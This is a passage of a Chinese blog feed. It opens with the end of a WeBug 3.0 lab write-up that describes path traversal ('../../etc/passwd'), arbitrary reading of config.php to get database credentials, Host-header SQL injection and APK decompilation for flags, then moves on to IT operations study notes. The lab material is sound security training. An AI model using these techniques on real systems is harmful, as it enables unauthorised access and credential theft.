start="15"><li>在<code>flag</code>中输入：<code>83242lkjKJ(*&amp;*^*&amp;k0</code></li></ol><p><img src="/images/mk-2020-03-17-22-11-40.png" alt></p><hr><h2 id="中级第一关-出来点东西吧"><a href="#中级第一关-出来点东西吧" class="headerlink" title="中级第一关-出来点东西吧"></a>中级第一关-出来点东西吧</h2><blockquote><p>../../etc/passwd</p></blockquote><h3 id="工具-17"><a href="#工具-17" class="headerlink" title="工具"></a>工具</h3><ul><li>御剑</li></ul><h3 id="步骤-18"><a href="#步骤-18" class="headerlink" title="步骤"></a>步骤</h3><ol><li>想看看外面的世界，明显存在某些可以访问其他地方的东西</li></ol><p><img src="/images/mk-2020-03-17-22-30-59.png" alt></p><ol start="2"><li>依次把 <code>usa.php</code> 等加入字典，更新 <code>DIR.txt</code>。扫描当前目录。发现 <code>cc</code> 目录和 <code>img</code> 目录。</li></ol><p><img src="/images/mk-2020-03-17-22-31-19.png" alt></p><ol start="3"><li>扫描 <code>cc</code> 和 <code>img</code> 目录，发现类似配置文件：<code>config.php</code></li></ol><p><img src="/images/mk-2020-03-17-22-31-33.png" alt></p><ol start="4"><li><p>尝试利用文件任意读取，访问 <code>config.php</code>，得到一些信息，标题显示的却是“上一道题目的地址”，真奇怪</p><p><img src="/images/mk-2020-03-17-22-31-49.png" alt></p><p>显示图片<code>?country=cc/usa.php</code></p><p><img src="/images/mk-2020-03-17-22-32-01.png" alt></p></li><li><p>从 <code>3306</code> 端口，推测可能是数据库账号密码，访问 <code>phpmyadmin</code>，输入刚刚获取的信息，发现登陆失败</p></li></ol><p><img src="/images/mk-2020-03-17-22-32-29.png" alt></p><hr><h2 id="中级第二关-提交方式是怎么样的啊？"><a href="#中级第二关-提交方式是怎么样的啊？" class="headerlink" title="中级第二关-提交方式是怎么样的啊？"></a>中级第二关-提交方式是怎么样的啊？</h2><blockquote><p>pass！</p></blockquote><h3 id="工具-18"><a href="#工具-18" class="headerlink" title="工具"></a>工具</h3><ul><li><p>御剑</p></li><li><p>burp suite</p></li></ul><h3 id="步骤-19"><a href="#步骤-19" class="headerlink" title="步骤"></a>步骤</h3><ol><li>主页</li></ol><p><img src="/images/mk-2020-03-17-22-35-47.png" alt></p><ol start="2"><li>扫一下目录，发现 config.php,f 直接访问发现错误。</li></ol><p><img src="/images/mk-2020-03-17-22-36-13.png" alt></p><ol start="3"><li>抓包</li></ol><p><img src="/images/mk-2020-03-17-22-37-07.png" alt></p><ol start="4"><li>改包</li></ol><p><img src="/images/mk-2020-03-17-22-37-20.png" alt></p><ol start="5"><li>发现存在任意文件读取漏洞</li></ol><p><img src="/images/mk-2020-03-17-22-37-32.png" alt></p><hr><h2 id="中级第三关-我还是一个注入"><a href="#中级第三关-我还是一个注入" class="headerlink" title="中级第三关-我还是一个注入"></a>中级第三关-我还是一个注入</h2><blockquote><p>怎么又 TM 注入！</p></blockquote><h3 id="工具-19"><a href="#工具-19" class="headerlink" title="工具"></a>工具</h3><ul><li>burp suite</li></ul><h3 id="步骤-20"><a href="#步骤-20" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>主页</p><p><img src="/images/mk-2020-03-17-22-40-43.png" alt></p></li><li><p>试试<code>X-Forwarder-for</code>注入，发现没反应</p><p><img src="/images/mk-2020-03-17-22-40-54.png" alt></p></li><li><p>试试<code>Host</code>头注入</p><p><img src="/images/mk-2020-03-17-22-41-22.png" alt></p></li><li><p>得到回显，但是不是 3 列</p><p><img src="/images/mk-2020-03-17-22-41-37.png" alt></p></li><li><p>是 4 列</p><p><img src="/images/mk-2020-03-17-22-41-48.png" alt></p></li><li><p>构造 <code>sql</code> 注入语句，得到当前数据库的所有表</p><p><img src="/images/mk-2020-03-17-22-41-57.png" alt></p></li><li><p>拿 <code>flag</code> 的值</p><p><img src="/images/mk-2020-03-17-22-42-08.png" alt></p></li><li><p>成功</p><p><img src="/images/mk-2020-03-17-22-42-24.png" alt></p></li><li><p>拿账号密码</p><p><img src="/images/mk-2020-03-17-22-42-38.png" alt></p></li></ol><hr><h2 id="中级第四关-APK里面有一个flag"><a href="#中级第四关-APK里面有一个flag" class="headerlink" title="中级第四关-APK里面有一个flag"></a>中级第四关-APK里面有一个flag</h2><blockquote><p>看看 apk</p></blockquote><h3 id="工具-20"><a href="#工具-20" class="headerlink" title="工具"></a>工具</h3><ul><li>360 解压</li><li>android-killer</li></ul><h3 id="步骤-21"><a href="#步骤-21" class="headerlink" title="步骤"></a>步骤</h3><h4 id="下载-apk-文件"><a href="#下载-apk-文件" class="headerlink" title="下载 apk 文件"></a>下载 apk 文件</h4><p>点击会下载一个 apk 文件</p><p><img src="/images/mk-2020-03-17-22-46-44.png" alt></p><h4 id="安装-apk-测试"><a href="#安装-apk-测试" class="headerlink" title="安装 apk 测试"></a>安装 apk 测试</h4><ol><li>在手机上安装 apk</li></ol><p><img src="/images/mk-2020-03-17-22-47-54.png" alt></p><ol start="2"><li>似乎要点击 300 下</li></ol><p><img src="/images/mk-2020-03-17-22-48-18.png" alt></p><ol start="3"><li>中途退出要重新点击，别问我怎么知道</li></ol><p><img src="/images/mk-2020-03-17-22-48-34.png" alt></p><ol start="4"><li>常规获取</li></ol><p><img src="/images/mk-2020-03-17-22-48-55.png" alt></p><ol start="5"><li>累死人的操作，把机械点击操作交给模拟器吧</li></ol><p><img src="/images/mk-2020-03-17-22-49-11.png" alt></p><ol start="6"><li>看起来是<code>md5</code>加密的东西</li></ol><p><img src="/images/mk-2020-03-17-22-49-25.png" alt></p><ol start="7"><li>解密，原来明文是 <code>flagisme</code></li></ol><p><img src="/images/mk-2020-03-17-22-49-37.png" alt></p><h4 id="使用-android-killer"><a href="#使用-android-killer" class="headerlink" title="使用 android-killer"></a>使用 android-killer</h4><p>用<code>android-killer</code>打开<code>test.apk</code>,对<code>smali</code>语法不熟悉，换一下方式</p><p><img src="/images/mk-2020-03-17-22-50-27.png" alt></p><h4 id="解压-apk"><a href="#解压-apk" class="headerlink" title="解压 apk"></a>解压 apk</h4><ol><li>准备使用工具反编译，先把<code>test.apk</code>改成<code>test.zip</code>，进行解压</li></ol><p><img src="/images/mk-2020-03-17-22-51-07.png" alt></p><ol start="2"><li>解压得到</li></ol><p><img src="/images/mk-2020-03-17-22-51-18.png" alt></p><ol start="3"><li>准备工具，分别解压</li></ol><p><img src="/images/mk-2020-03-17-22-51-31.png" alt></p><ol start="4"><li>把<code>test.zip</code>解压出来的文件夹中把<code>classes.dex</code>复制到刚刚解压出来的<code>dex2jar-2.0</code>文件夹中</li></ol><p><img src="/images/mk-2020-03-17-22-51-44.png" alt></p><ol start="5"><li>执行命令：<code>d2j-dex2jar classes.dex</code><br>把<code>classes.dex</code>编译成<code>jar</code>包</li></ol><p><img src="/images/mk-2020-03-17-22-51-54.png" alt></p><ol start="6"><li>得到<code>jar</code>包：<code>classes-dex2jar.jar</code></li></ol><p><img src="/images/mk-2020-03-17-22-52-17.png" alt></p><ol start="7"><li>打开刚刚解压出来的<code>jd-gui-windows-1.4.0</code>的文件夹中的<code>jd-gui.exe</code>，点击<code>File</code>-&gt;<code>Open File</code>,打开<code>classes-dex2jar.jar</code></li></ol><p><img src="/images/mk-2020-03-17-22-52-27.png" alt></p><ol start="8"><li>查看<code>classes-dex2jar.jar</code>包中的入口文件：<code>MainActivity.class</code>，发现关键语句</li></ol><p><img src="/images/mk-2020-03-17-22-52-40.png" alt></p><ol start="9"><li>分析得到，是四个字符串经过<code>BASE64</code>加密再拼接在一起的，组合一下字符串：<code>YWZlOGU5MWI=NGM1NGFkOGViMzA0M2UzNjY=ZGJjYTA1Zg==</code>拿去进行<code>BASE64</code>解密</li></ol><p><img src="/images/mk-2020-03-17-22-52-51.png" alt></p><ol start="10"><li>解密得到：<code>afe8e91b4c54ad8eb3043e366dbca05f</code></li></ol><p><img src="/images/mk-2020-03-17-22-53-01.png" alt></p><h3 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h3><p>Q：为什么图片颜色怪怪的？</p><p>A：当前图片是从 xmind 文件中直接拷贝出来的，使用的 xmind 版本为 XMind 8 Update 9，其中 xmind 文件的图片颜色显示正常。</p>]]></content>
    
    <summary type="html">
    
      作者在webug3.0的测试平台上测试后所写的一些测试笔记
    
    </summary>
    
    
      <category term="网络安全" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="WeBug" scheme="http://yoursite.com/tags/WeBug/"/>
    
  </entry>
  
  <entry>
    <title>信息系统运行与维护</title>
    <link href="http://yoursite.com/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/20180913-6cb531db.html"/>
    <id>http://yoursite.com/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/20180913-6cb531db.html</id>
    <published>2018-09-13T02:26:41.000Z</published>
    <updated>2021-04-08T03:18:06.377Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="信息系统运行与维护"><a href="#信息系统运行与维护" class="headerlink" title="信息系统运行与维护"></a>信息系统运行与维护</h1><h2 id="一、基础概念篇"><a href="#一、基础概念篇" class="headerlink" title="一、基础概念篇"></a>一、基础概念篇</h2><h3 id="第-1-章：信息系统运维概述"><a href="#第-1-章：信息系统运维概述" class="headerlink" title="第 1 章：信息系统运维概述"></a>第 1 章：信息系统运维概述</h3><h4 id="1-1-信息系统概述"><a href="#1-1-信息系统概述" class="headerlink" title="1.1 信息系统概述"></a>1.1 信息系统概述</h4><h5 id="1-1-1-信息系统"><a href="#1-1-1-信息系统" class="headerlink" title="1.1.1 信息系统"></a>1.1.1 信息系统</h5><ol><li>技术要素</li></ol><ul><li><p>1）数据</p><ul><li>（1）信息</li><li>（2）知识</li><li>（3）智慧</li></ul></li></ul><ul><li>2）硬件</li><li><p>3）软件</p><ul><li>（1）基础软件</li><li>（2）信息系统软件</li></ul></li><li><p>4）通信网络</p></li><li>5）基础设施</li></ul><ol start="2"><li>人</li><li>组织</li></ol><h5 id="1-1-2-信息系统的影响因素"><a href="#1-1-2-信息系统的影响因素" class="headerlink" title="1.1.2 信息系统的影响因素"></a>1.1.2 信息系统的影响因素</h5><ol><li>内部因素</li></ol><ul><li>（1）战略计划</li><li>（2）管理高层</li><li>（3）用户需求</li><li>（4）IT 部门</li><li>（5）现行信息化基础</li></ul><ol start="2"><li>外部因素</li></ol><ul><li>（1）技术</li><li>（2）供应商</li><li>（3）客户</li><li>（4）竞争对手</li><li>（5）经济环境</li><li>（6）政府</li></ul><ol start="3"><li>新兴 IT 技术系统的影响</li></ol><ul><li>1）转变了商业模式</li><li>2）降低了信息系统建设的成本和风险</li><li>3）改变了信息系统建设的内涵</li><li>4）改变了信息系统运维的职能</li><li>5）突破了时空的局限</li><li>6）高度关注数据的安全与价值</li></ul><h4 id="1-2-信息系统运维"><a href="#1-2-信息系统运维" class="headerlink" title="1.2 信息系统运维"></a>1.2 信息系统运维</h4><h5 id="1-2-1-信息系统运维的概念"><a href="#1-2-1-信息系统运维的概念" class="headerlink" title="1.2.1 信息系统运维的概念"></a>1.2.1 信息系统运维的概念</h5><ul><li><p>内容：</p><ul><li>（1）泛化的观点：指软件交互后围绕它所进行的任何工作</li><li>（2）纠错的观点：指软件运行中错误的发现和更正</li><li>（3）适应的观点：为适应内外环境的变化</li><li>（4）用户支持的观点：指为软件最终用户提供的支持</li></ul></li></ul><ol><li>“管理”的视角</li><li>“视角”的视角</li><li>“安全”的视角</li><li>“治理”的视角</li><li>“实践”的视角</li></ol><h5 id="1-2-2-信息系统运维的框架"><a href="#1-2-2-信息系统运维的框架" class="headerlink" title="1.2.2 信息系统运维的框架"></a>1.2.2 信息系统运维的框架</h5><ol><li>信息系统运维的目标</li></ol><ul><li>（1）安全</li><li>（2）可靠</li><li>（3）可用</li><li>（4）可控</li></ul><ol start="2"><li>信息系统运维的内容</li></ol><ul><li>（1）例行操作</li><li>（2）响应支持</li><li>（3）优化改善</li><li>（4）咨询评估</li></ul><ol start="3"><li>信息系统运维的对象</li></ol><ul><li>（1）基础环境</li><li>（2）网络平台</li><li>（3）硬件设备</li><li>（4）基础软件</li><li>（5）信息系统软件</li><li>（6）数据</li></ul><ol start="4"><li>信息系统运维平台</li><li>信息系统运维支撑要素</li></ol><h5 id="1-2-3-信息系统运维的要求"><a href="#1-2-3-信息系统运维的要求" class="headerlink" title="1.2.3 信息系统运维的要求"></a>1.2.3 信息系统运维的要求</h5><ol><li>银行业</li></ol><ul><li>（1）可用性要求级别高</li><li>（2）安全性要求级别高</li><li>（3）数据运维责任大</li></ul><ol start="2"><li>大型网站</li></ol><ul><li>（1）线上稳定</li><li>（2）客户体验为先</li><li>（3）迫切要求解决峰值运维问题</li><li>（4）自动化要求高</li></ul><ol start="3"><li>电信行业</li></ol><ul><li>（1）“全程全网性”</li><li>（2）数据利用与分析的需求强烈</li><li>（3）运维成本压力大</li></ul><ol start="4"><li>政府</li></ol><ul><li>（1）安全级别高</li><li>（2）业务的不间断运维需求高</li><li>（3）例行运维亟需加强</li></ul><ol start="5"><li>制造业</li></ol><ul><li>（1）集成运维需求强烈</li><li>（2）运维管理亟待重视</li><li>（3）安全运维不可忽略</li></ul><h4 id="1-3-信息系统运维的发展"><a href="#1-3-信息系统运维的发展" class="headerlink" title="1.3 信息系统运维的发展"></a>1.3 信息系统运维的发展</h4><h5 id="1-3-1-信息系统运维的发展现状"><a href="#1-3-1-信息系统运维的发展现状" class="headerlink" title="1.3.1 信息系统运维的发展现状"></a>1.3.1 信息系统运维的发展现状</h5><ol><li>从具体工作来看</li><li>从我国信息系统运维的总体现状来看</li></ol><ul><li>（1）从时间周期来看</li><li>（2）从信息系统效益来看</li><li>（3）从资金投入来看</li></ul><ol start="3"><li>从国外信息系统运维的情形来看</li><li>从运维人才的需求与培养来看</li></ol><h5 id="1-3-2-信息系统运维的发展阶段"><a href="#1-3-2-信息系统运维的发展阶段" class="headerlink" title="1.3.2 信息系统运维的发展阶段"></a>1.3.2 信息系统运维的发展阶段</h5><ol><li>网络系统管理阶段</li><li>IT 服务管理阶段</li><li>业务服务阶段</li></ol><h5 id="1-3-3-信息系统运维的发展趋势"><a href="#1-3-3-信息系统运维的发展趋势" class="headerlink" title="1.3.3 信息系统运维的发展趋势"></a>1.3.3 信息系统运维的发展趋势</h5><ol><li>理念层面–运维之道</li></ol><ul><li>1）服务</li></ul><ul><li>2）敏捷<ul><li>（1）意识部署已成为产品发布的瓶颈的敏捷开发者</li><li>（2）来自于快速增长的 Web2.0 企业</li></ul></li></ul><ol start="2"><li>管理层面–运维之略</li><li>技术层面–运维之术</li></ol><ul><li>1）自动化</li><li>2）虚拟化</li><li>3）数据化</li><li>4）绿色化</li></ul><h3 id="第-2-章：信息系统运维的组织与管理"><a href="#第-2-章：信息系统运维的组织与管理" class="headerlink" title="第 2 章：信息系统运维的组织与管理"></a>第 2 章：信息系统运维的组织与管理</h3><h4 id="2-1-信息系统运维的管理"><a href="#2-1-信息系统运维的管理" class="headerlink" title="2.1 信息系统运维的管理"></a>2.1 信息系统运维的管理</h4><h5 id="2-1-1-信息系统运维管理体系框架"><a href="#2-1-1-信息系统运维管理体系框架" class="headerlink" title="2.1.1 信息系统运维管理体系框架"></a>2.1.1 信息系统运维管理体系框架</h5><ol><li>信息系统运维管理职能</li></ol><ul><li>设施运维</li><li>软件运维</li><li>数据运维</li><li>安全运维</li><li>…..</li></ul><ol start="2"><li>信息系统运维管理流程</li></ol><ul><li>事件管理</li><li>事故管理</li><li>问题管理</li><li>配置管理</li><li>变更管理</li><li>发布管理</li><li>知识管理</li><li>…..</li></ul><ol start="3"><li>信息系统运维管理系统与专用工具</li></ol><h5 id="2-1-2-信息系统运维管理主要流程"><a href="#2-1-2-信息系统运维管理主要流程" class="headerlink" title="2.1.2 信息系统运维管理主要流程"></a>2.1.2 信息系统运维管理主要流程</h5><ul><li><p>目标：</p><ul><li>（1）标准话</li><li>（2）流程化</li><li>（3）自动化</li></ul></li></ul><ol><li><p>事件管理</p><ul><li>（1）事件发生和通告</li><li>（2）事件检测和录入</li><li>（3）事件过滤</li><li>（4）事件分类</li><li>（5）事件关联</li><li>（6）响应选择</li><li>（7）事件关闭</li><li>（8）事件评估</li></ul></li><li><p>事故管理</p><ul><li>（1）事故识别与纪录</li><li>（2）事故分类和优先级处理</li><li>（3）初步支持</li><li>（4）事故升级</li><li>（5）调查和诊断</li><li>（6）解决和恢复</li></ul></li><li><p>问题管理</p><ul><li>（1）问题检测和记录</li><li>（2）问题分类和优先级处理</li><li>（3）问题调查和诊断</li><li>（4）创建已知错误记录</li><li>（5）解决问题</li><li>（6）关闭问题</li><li>（7）重大问题的评估</li></ul></li><li><p>配置管理</p><ul><li>（1）管理规划</li><li>（2）配置识别</li><li>（3）配置控制</li><li>（4）状态记录和报告</li><li>（5）确认和审核</li></ul></li><li><p>变更管理</p><ul><li>（1）创建变更请求</li><li>（2）记录和过滤变更请求</li><li>（3）评审变更</li><li>（4）授权变更</li><li>（5）变更规划</li><li>（6）协调变更实施</li><li>（7）回顾和关闭变更</li></ul></li><li><p>发布管理</p><ul><li>1）发布规划</li></ul><ul><li><p>2）发布设计、构建和配置</p><ul><li>（1）设计</li><li>（2）构建</li><li>（3）配置</li></ul></li></ul><ul><li>3）发布验收</li><li>4）试运营规划</li><li>5）沟通、准备和培训</li><li>6）发布分发和安装</li></ul></li><li><p>知识管理</p><ul><li>（1）知识识别和分享</li><li>（2）初始化知识库</li><li>（3）知识提交和入库</li><li>（4）知识过滤和审核</li><li>（5）知识发布和分享</li><li>（6）知识维护和评估</li></ul></li></ol><h5 id="2-1-3-信息系统运维管理制度"><a href="#2-1-3-信息系统运维管理制度" class="headerlink" title="2.1.3 信息系统运维管理制度"></a>2.1.3 信息系统运维管理制度</h5><ul><li>（1）网络管理制度</li><li>（2）系统和应用管理制度</li><li>（3）安全管理制度</li><li>（4）存储备份管理制度</li><li>（5）故障管理制度</li><li>（6）技术支持工具管理制度</li><li>（7）质量考核制度</li></ul><h5 id="2-1-4-信息系统运维管理系统与专用工具"><a href="#2-1-4-信息系统运维管理系统与专用工具" class="headerlink" title="2.1.4 信息系统运维管理系统与专用工具"></a>2.1.4 信息系统运维管理系统与专用工具</h5><h4 id="2-2-信息系统运维的组织"><a href="#2-2-信息系统运维的组织" class="headerlink" title="2.2 信息系统运维的组织"></a>2.2 信息系统运维的组织</h4><h5 id="2-2-1-信息系统运维的任务"><a href="#2-2-1-信息系统运维的任务" class="headerlink" title="2.2.1 信息系统运维的任务"></a>2.2.1 信息系统运维的任务</h5><ol><li><p>信息系统的日常运行管理</p><ul><li>（1）数据的收集</li><li>（2）例行信息处理及服务工作</li><li>（3）计算机硬件的运维</li><li>（4）系统的安全管理</li></ul></li><li><p>信息系统运行情况的记录</p><ul><li>（1）有关工作数量的信息</li><li>（2）工作效率</li><li>（3）系统所提供的信息服务的质量</li><li>（4）系统的维护</li><li>（5）系统的故障情况</li></ul></li><li><p>系统运行情况的检查与评价</p><ul><li>（1）系统是否达到预定目标，目标是否需做修改</li><li>（2）系统的适应性、安全性评价</li><li>（3）系统的社会经济效益评价</li></ul></li></ol><h5 id="2-2-2-信息系统运维管理的职责"><a href="#2-2-2-信息系统运维管理的职责" class="headerlink" title="2.2.2 信息系统运维管理的职责"></a>2.2.2 信息系统运维管理的职责</h5><ul><li>P45</li></ul><h5 id="2-2-3-信息系统运维人员的管理"><a href="#2-2-3-信息系统运维人员的管理" class="headerlink" title="2.2.3 信息系统运维人员的管理"></a>2.2.3 信息系统运维人员的管理</h5><ol><li><p>运维人员的内容</p><ul><li>（1）明确各业务人员的任务和职权范围</li><li>（2）对每个岗位的工作定期检查与评价</li><li>（3）在工作中对工作人员进行培训</li></ul></li><li><p>运维人员管理的意义</p></li><li><p>运维人员管理的意识</p><ul><li>（1）服务意识</li><li>（2）学习意识</li><li>（3）创新意识</li><li>（4）专业意识</li><li>（5）主动意识</li><li>（6）安全意识</li><li>（7）团队意识</li></ul></li><li><p>运维人员的学习培训</p></li></ol><h5 id="2-2-4-信息系统的运维模式"><a href="#2-2-4-信息系统的运维模式" class="headerlink" title="2.2.4 信息系统的运维模式"></a>2.2.4 信息系统的运维模式</h5><ol><li>自主运维模式</li><li>完全外包运维模式</li><li>混合运维模式</li></ol><h4 id="2-3-信息系统运维的外包"><a href="#2-3-信息系统运维的外包" class="headerlink" title="2.3 信息系统运维的外包"></a>2.3 信息系统运维的外包</h4><h5 id="2-3-1-信息系统运维外包的概念"><a href="#2-3-1-信息系统运维外包的概念" class="headerlink" title="2.3.1 信息系统运维外包的概念"></a>2.3.1 信息系统运维外包的概念</h5><ul><li>（1）有利于提高组织竞争力</li><li>（2）借助专业公司的管理流程和工具软件降低信息系统的成本</li><li>（3）提高服务质量、降低故障率</li><li>（4）降低业务部门隐性成本</li></ul><h5 id="2-3-2-信息系统运维外包的模式"><a href="#2-3-2-信息系统运维外包的模式" class="headerlink" title="2.3.2 信息系统运维外包的模式"></a>2.3.2 信息系统运维外包的模式</h5><ol><li>完全外包模式</li><li>部分外包模式</li></ol><h5 id="2-3-3-信息系统运维外包的内容"><a href="#2-3-3-信息系统运维外包的内容" class="headerlink" title="2.3.3 信息系统运维外包的内容"></a>2.3.3 信息系统运维外包的内容</h5><ol><li><p>桌面支持外包</p><ul><li>（1）系统初始检查</li><li>（2）硬件故障解决</li><li>（3）硬件扩容升级</li><li>（4）软件系统支持</li><li>（5）防病毒系统的支持</li><li>（6）网络系统的支持</li><li>（7）日常维护管理</li><li>（8）咨询服务</li></ul></li><li><p>基础设施外包</p><ul><li>（1）系统、服务器维护支持</li><li>（2）软件、服务调试</li><li>（3）网络系统维护</li><li>（4）系统迁移</li><li>（5）数据库维护支持</li><li>（6）数据存储和容灾管理</li><li>（7）安全系统的支持</li><li>（8）网站支持</li><li>（9）咨询服务</li></ul></li><li><p>应用系统外包</p></li></ol><h5 id="2-3-4-信息系统运维外包的风险管理"><a href="#2-3-4-信息系统运维外包的风险管理" class="headerlink" title="2.3.4 信息系统运维外包的风险管理"></a>2.3.4 信息系统运维外包的风险管理</h5><ol><li><p>风险分类</p><ul><li>（1）外部环境不确定性</li><li>（2）运维外包决策的复杂性</li><li>（3）运维外包双方的关系复杂性</li><li>（4）运维工作本身的复杂性</li></ul></li><li><p>风险分析</p><ul><li>（1）组织成本有可能增加</li><li>（2）组织对服务商的依赖和外包合同缺乏灵活性可能降低组织的灵活性</li><li>（3）可能会泄露组织的商业机密</li><li>（4）对外包商缺乏恰当的监督</li></ul></li><li><p>风险评估</p></li><li>风险规避<ul><li>1）核算外包成本，控制额外支出</li><li>2）组织仍需不断学习</li><li>3）选择合适的外包商</li><li>4）签订完整灵活的外包合同</li></ul></li></ol><h4 id="2-4-信息系统运维管理标准"><a href="#2-4-信息系统运维管理标准" class="headerlink" title="2.4 信息系统运维管理标准"></a>2.4 信息系统运维管理标准</h4><h5 id="2-4-1“ITIL”"><a href="#2-4-1“ITIL”" class="headerlink" title="2.4.1“ITIL”"></a>2.4.1“ITIL”</h5><ol><li>“ITIL”的产生与发展</li><li>“ITIL v3 核心架构”</li></ol><h5 id="2-4-2“COBIT”"><a href="#2-4-2“COBIT”" class="headerlink" title="2.4.2“COBIT”"></a>2.4.2“COBIT”</h5><h4 id="2-5-信息系统运维管理系统与专用工具"><a href="#2-5-信息系统运维管理系统与专用工具" class="headerlink" title="2.5 信息系统运维管理系统与专用工具"></a>2.5 信息系统运维管理系统与专用工具</h4><h5 id="2-5-1-信息系统运维管理系统功能框架"><a href="#2-5-1-信息系统运维管理系统功能框架" class="headerlink" title="2.5.1 信息系统运维管理系统功能框架"></a>2.5.1 信息系统运维管理系统功能框架</h5><ol><li><p>资产管理</p><ul><li><p>1）静态资产信息管理</p><ul><li>（1）资产信息维护</li><li>（2）资产信息分析统计</li><li>（3）资产生命周期管理</li><li>（4）辅助决策</li></ul></li></ul><ul><li>2）动态资产信息管理</li></ul></li><li><p>流程管理</p><ul><li><p>1）事件管理</p><ul><li>功能：P58</li></ul></li><li><p>2)事故管理</p><ul><li>功能：P59</li></ul></li><li><p>3）问题管理</p><ul><li>功能：P59</li></ul></li><li><p>4）配置管理</p><ul><li>功能：P60</li></ul></li><li><p>5）变更管理</p><ul><li>功能：P60</li></ul></li><li><p>6）发布管理</p><ul><li>功能：P61</li></ul></li><li><p>7）知识管理</p><ul><li>功能：P61</li></ul></li></ul></li><li><p>监控管理</p><ul><li>1）视图管理</li></ul><ul><li><p>2）资源监控</p><ul><li>（1）资源信息维护</li><li>（2）资源模型编辑</li><li>（3）可视化监控</li><li>（4）配置信息下发和配置文件管理</li><li>（5）资源信息统计分析</li></ul></li></ul><ul><li>3）故障管理</li><li>4）性能管理</li></ul></li><li><p>外包管理</p><ul><li>1）结果控制管理</li><li>2）过程控制管理</li></ul></li><li><p>安全管理</p></li><li>综合管理</li></ol><h5 id="2-5-2-运维管理系统"><a href="#2-5-2-运维管理系统" class="headerlink" title="2.5.2 运维管理系统"></a>2.5.2 运维管理系统</h5><ul><li>（1）CA 公司的 USPSD</li><li>（2）HP 公司的运维管理平台</li><li>（3）北塔的运维管理系统 BTIM</li><li>（4）开源运维管理系统</li></ul><h5 id="2-5-3-运维管理专用工具"><a href="#2-5-3-运维管理专用工具" class="headerlink" title="2.5.3 运维管理专用工具"></a>2.5.3 运维管理专用工具</h5><ol><li><p>“ITIL”流程管理平台 Remedy</p><ul><li>（1）BMC Remedy Service Desk</li><li>（2）BMC Remedy Change and Release Management</li><li>（3）BMC Remedy Asset Configuration Management</li><li>（4）BMC Remedy Level Management</li><li>（5）BMC Discovery</li><li>（6）BMC Configuration Mangement</li></ul></li><li><p>自动化运维操作管理平台</p></li><li><p>配置管理系统</p><ul><li>（1）信息整合</li><li>（2）关系映射</li><li>（3）流程支持</li><li>（4）软件库与硬件库</li></ul></li></ol><h4 id="2-6-信息系统运维管理的发展–云运维管理"><a href="#2-6-信息系统运维管理的发展–云运维管理" class="headerlink" title="2.6 信息系统运维管理的发展–云运维管理"></a>2.6 信息系统运维管理的发展–云运维管理</h4><h5 id="2-6-1-云运维管理概述"><a href="#2-6-1-云运维管理概述" class="headerlink" title="2.6.1 云运维管理概述"></a>2.6.1 云运维管理概述</h5><h5 id="2-6-2-云运维管理的功能"><a href="#2-6-2-云运维管理的功能" class="headerlink" title="2.6.2 云运维管理的功能"></a>2.6.2 云运维管理的功能</h5><ol><li>自服务门户</li><li>身份与访问管理</li><li>服务目录管理</li><li>服务规则管理</li><li>资源调度管理</li><li>资源监控管理</li><li>服务合规审计</li><li>服务运营监控</li><li>服务计量管理</li><li>服务质量管理</li><li>服务交付管理</li><li>系统管理</li><li>管理集成</li><li>管理门户</li></ol><h2 id="二、核心内容篇"><a href="#二、核心内容篇" class="headerlink" title="二、核心内容篇"></a>二、核心内容篇</h2><h3 id="第-3-章：信息系统设施运维"><a href="#第-3-章：信息系统设施运维" class="headerlink" title="第 3 章：信息系统设施运维"></a>第 3 章：信息系统设施运维</h3><h4 id="3-1-信息系统设施的管理体系"><a href="#3-1-信息系统设施的管理体系" class="headerlink" title="3.1 信息系统设施的管理体系"></a>3.1 信息系统设施的管理体系</h4><ol><li>信息系统设施运维的对象</li></ol><ul><li>（1）基础环境</li><li>（2）网络</li><li>（3）硬件</li><li>（4）基础软件</li></ul><ol start="2"><li>信息系统设施运维的内容</li><li>信息系统设施运维的制度</li><li>信息系统设施运维的人员</li></ol><h4 id="3-2-信息系统设施运维的内容"><a href="#3-2-信息系统设施运维的内容" class="headerlink" title="3.2 信息系统设施运维的内容"></a>3.2 信息系统设施运维的内容</h4><h5 id="3-2-1-例行操作运维"><a href="#3-2-1-例行操作运维" class="headerlink" title="3.2.1 例行操作运维"></a>3.2.1 例行操作运维</h5><ol><li>设施监控</li></ol><ul><li>1）基础设施的监控</li></ul><ul><li><p>2）网络设施的监控</p><ul><li>（1）网络拓扑监控</li><li>（2）网络设备监控</li><li>（3）网络链路监控</li><li>（4）网络设备端口监控</li></ul></li><li><p>3）硬件设施的监控</p><ul><li>（1）状态监控</li><li>（2）性能监控</li><li>（3）可用性监控</li></ul></li><li><p>4）基础软件的监控</p><ul><li>（1）数据库监控</li><li>（2）中间件监控</li><li>（3）应用服务监控</li></ul></li></ul><ol start="2"><li><p>预防性检查</p><ul><li>（1）基础设施的预防性检查</li><li>（2）网络设施的预防性检查</li><li>（3）硬件设施的预防性检查</li><li>（4）基础软件的预防性检查</li></ul></li><li><p>常规操作</p></li></ol><ul><li><p>1）基础环境的常规操作</p><ul><li>（1）基础类操作</li><li>（2）测试类操作</li><li>（3）数据类操作</li></ul></li></ul><ul><li>2）网络设施的常规操作</li><li>3）硬件设施的常规操作</li><li>4）基础软件的常规操作</li></ul><h5 id="3-2-2-响应支持运维"><a href="#3-2-2-响应支持运维" class="headerlink" title="3.2.2 响应支持运维"></a>3.2.2 响应支持运维</h5><ol><li>事件驱动响应</li></ol><ul><li><p>1）基础设施的事件驱动响应</p><ul><li>（1）空调系统</li><li>（2）供配电系统</li><li>（3）发电机</li><li>（4）UPS 系统</li><li>（5）消防系统</li><li>（6）安全系统</li></ul></li><li><p>2）网络设施的事件驱动响应</p></li><li>3）硬件设施的事件驱动响应</li><li>4）基础软件的事件驱动响应</li></ul><ol 